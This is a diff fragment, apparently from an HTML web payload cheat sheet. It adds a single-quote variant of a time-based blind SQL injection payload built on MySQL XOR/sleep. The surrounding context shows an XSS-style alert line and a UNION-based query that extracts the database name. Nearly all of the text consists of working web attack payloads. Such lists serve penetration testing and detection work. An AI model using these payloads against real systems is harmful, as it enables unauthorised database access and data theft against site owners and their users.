@@ -2079,6 +2079,7 @@ alert?.(1337,)?.()
 
 <h3 id="sql-injection">SQL Injection</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0&quot;XOR(if(now()=sysdate(),sleep(9),0))XOR&quot;Z
+0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z
 
 #MYSQL (UNION based)
 > get db name: 								0 union select 1,2,database()
